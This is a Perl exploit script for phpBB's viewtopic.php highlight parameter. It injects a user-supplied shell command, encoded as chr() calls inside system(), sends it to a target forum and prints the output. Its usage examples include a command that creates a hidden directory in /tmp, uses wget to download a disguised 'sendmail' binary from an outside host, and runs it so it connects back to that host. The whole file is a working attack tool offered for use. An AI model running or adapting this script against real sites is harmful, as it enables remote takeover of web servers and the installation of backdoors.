#!/usr/bin/perl

use LWP;
use Getopt::Std;

sub usage{
  print "usage: $0 -i<url> -t<valid topic_number> -c<commands to run on target>
 
  -i <http://127.0.0.1:80/forum/>
  -t <viewtopic.php?t=[topic_number]>
  -c <Command to run on target>
 
Examples:
1) $0 -i http://127.0.0.1:80/forum/ -t1 -c\"uname -a;ls -la;w\"
2) $0 -i http://127.0.0.1:80/forum/ -t1 -c\"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://555.1.2.150:5555/sendmail -Osendmail;chmod +x sendmail;D=-c555.1.2.150:9999 PATH=. sendmail) 2>/dev/null\"
";
}

getopts('i:p:c:t:h');

if($opt_h){
  usage();
  exit;
}

if(!$opt_i){
  print "Enter the URL and the directory where phpBB resides (ex. http://127.0.0.1/forum/): ";
  $host=<stdin>;
  chomp $host;
}
else{
  $host=$opt_i;
}

if(!$opt_t){
  print "Insert a valid topic number (viewtopic.php?t=[topic_number]): ";
  $topic= <stdin>;
  chomp $topic;
}
else{
  $topic= $opt_t;
}

if(!$opt_c){
  print "Insert the command to execute on the target: ";
  $cmd= <stdin>;
  chomp $cmd;
}
else {
  $cmd = $opt_c;
}

@command=split(//,$cmd);
$url = $host . "viewtopic.php?t=". $topic . "&highlight=%2527%252esystem(chr(";
$url .= ord("$command[0]");
for($indice=1;$indice<@command;$indice++) {
  $url .= ")%252echr(" . ord("$command[$indice]");
}
$url .= "))%252e%2527\n";

$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");

# Create a request
print "Sending:\n$url\n\n";

my $req = HTTP::Request->new(GET => $url);
$req->content($content);

# Pass request to the user agent and get a response back
my $res = $ua->request($req);
                                                                                                     
# Check the outcome of the response
if ($res->is_success) {
   $mycontent = $res->content;
    print $mycontent;
}
else {         
  print STDERR $res->error_as_HTML;
}
